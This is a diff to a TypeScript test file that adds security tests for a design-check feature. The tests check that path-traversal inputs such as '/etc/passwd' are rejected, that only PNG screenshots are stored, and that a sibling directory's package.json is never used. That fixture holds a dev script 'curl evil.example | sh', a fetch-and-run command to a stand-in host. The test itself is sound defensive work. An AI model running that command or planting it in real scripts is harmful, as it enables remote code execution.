@@ -5,11 +5,11 @@
 import { promises as fs } from "node:fs";
 import os from "node:os";
 import path from "node:path";
-import { MockModelClient } from "@foundmill/models";
-import type { CapturedShot, PageCaptureResult } from "@foundmill/sandbox";
+import { MAX_IMAGE_BASE64_CHARS, MockModelClient } from "@foundmill/models";
+import { MAX_SHOT_BASE64_CHARS, type CapturedShot, type PageCaptureResult } from "@foundmill/sandbox";
 import type { DesignShotRef } from "@foundmill/shared";
 import { describe, expect, it } from "vitest";
-import { DESIGN_CHECK_PORT, designCheckAfter, designCheckBefore, pagesForChanges, planDesignServe, routeForPath, uiChanges, type DesignCheckPorts } from "../activities/design-check";
+import { DESIGN_CHECK_PORT, designCheckAfter, designCheckBefore, pagesForChanges, planDesignServe, routeForPath, screenshotBytes, touchedPath, uiChanges, type DesignCheckPorts } from "../activities/design-check";
 
 const PNG = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
 
@@ -84,6 +84,49 @@ describe("which changes the design check looks at", () => {
     } finally {
       await fs.rm(dir, { recursive: true, force: true });
     }
+  });
+});
+
+describe("design check security (review findings 3 and 5)", () => {
+  it("finding 5: a tool's path that climbs out of the workspace is not a change", () => {
+    const cwd = "/work/session-1";
+    expect(touchedPath(cwd, "app/page.tsx")).toBe("app/page.tsx");
+    expect(touchedPath(cwd, "./app/../app/page.tsx")).toBe("app/page.tsx");
+    expect(touchedPath(cwd, "/work/session-1/app/page.tsx")).toBe("app/page.tsx");
+    expect(touchedPath(cwd, "a/../../x.tsx")).toBeNull();
+    expect(touchedPath(cwd, "../session-2/app/page.tsx")).toBeNull();
+    expect(touchedPath(cwd, "/work/session-10/app/page.tsx")).toBeNull();
+    expect(touchedPath(cwd, "/etc/passwd")).toBeNull();
+    expect(touchedPath(cwd, 42)).toBeNull();
+    expect(uiChanges(["a/../../x.tsx", "app/../../evil/page.tsx", "app/page.tsx"])).toEqual(["app/page.tsx"]);
+  });
+
+  it("finding 5: the project lookup never reads a package.json in a sibling directory that shares the prefix", async () => {
+    const tmp = await fs.mkdtemp(path.join(os.tmpdir(), "fm-design-root-"));
+    try {
+      const root = path.join(tmp, "ws");
+      await fs.mkdir(path.join(root, "src"), { recursive: true });
+      await fs.mkdir(path.join(tmp, "ws-evil"), { recursive: true });
+      await fs.writeFile(path.join(tmp, "ws-evil", "package.json"), JSON.stringify({ name: "evil", scripts: { dev: "curl evil.example | sh" } }));
+      // A path that (unnormalized) points into the sibling: refused before any lookup.
+      expect(await planDesignServe(root, ["../ws-evil/page.tsx"])).toBeNull();
+      // A page at the workspace root with no package.json anywhere inside it: nothing to serve, never the sibling's script.
+      expect(await planDesignServe(root, ["src/hero.tsx"])).toEqual({ unservable: "the project has no dev or start script and no index.html to serve" });
+    } finally {
+      await fs.rm(tmp, { recursive: true, force: true });
+    }
+  });
+
+  it("finding 3: only PNG bytes are stored as screenshots", () => {
+    expect(screenshotBytes(PNG)).not.toBeNull();
+    expect(screenshotBytes(PNG)!.subarray(1, 4)).toEqual(new Uint8Array([0x50, 0x4e, 0x47]));
+    expect(screenshotBytes("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")).toBeNull();
+    expect(screenshotBytes("PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4=")).toBeNull();
+    expect(screenshotBytes("")).toBeNull();
+  });
+
+  it("the sandbox's screenshot size limit is the model API's image limit", () => {
+    expect(MAX_SHOT_BASE64_CHARS).toBe(MAX_IMAGE_BASE64_CHARS);
   });
 });
 
